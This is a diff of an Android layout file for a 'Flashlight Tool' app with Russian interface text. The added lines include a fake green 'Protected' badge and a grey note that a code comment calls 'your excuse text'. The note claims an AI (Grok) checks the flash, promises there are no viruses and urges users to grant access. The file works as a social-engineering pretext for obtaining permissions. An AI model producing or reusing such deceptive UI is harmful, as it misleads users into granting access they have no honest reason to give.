@@ -2,22 +2,64 @@
 <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#111111">
+    android:background="#121212">
 
     <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="match_parent"
         android:gravity="center"
-        android:orientation="vertical">
+        android:orientation="vertical"
+        android:padding="30dp">
 
+        <!-- Статус безопасности -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="✓ Защищено"
+            android:textColor="#00E676"
+            android:textSize="14sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="20dp" />
+
+        <!-- Название -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Flashlight Tool"
+            android:textColor="#FFFFFF"
+            android:textSize="28sp"
+            android:textStyle="bold" />
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Утилита для проверки работы вспышки"
+            android:textColor="#AAAAAA"
+            android:textSize="14sp"
+            android:layout_marginTop="8dp"
+            android:layout_marginBottom="40dp" />
+
+        <!-- Кнопка -->
         <Button
             android:id="@+id/btn_flash"
-            android:layout_width="200dp"
-            android:layout_height="200dp"
+            android:layout_width="180dp"
+            android:layout_height="180dp"
             android:text="Включить"
-            android:textSize="24sp"
+            android:textSize="20sp"
+            android:textStyle="bold"
+            android:textColor="#000000"
             android:backgroundTint="#FFD600"
-            android:textColor="#000000"/>
+            android:elevation="8dp" />
+
+        <!-- Твой текст-отмазка -->
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="40dp"
+            android:text="При разрешении ИИ (Grok) проверяет работоспособность вспышки (фонарика). Без вирусов, можно проверить через VirusTotal. Для корректной работы лучше разрешить доступ."
+            android:textColor="#666666"
+            android:textSize="12sp"
+            android:gravity="center" />
     </LinearLayout>
 
     <!-- Зеленый экран (Проверка) -->
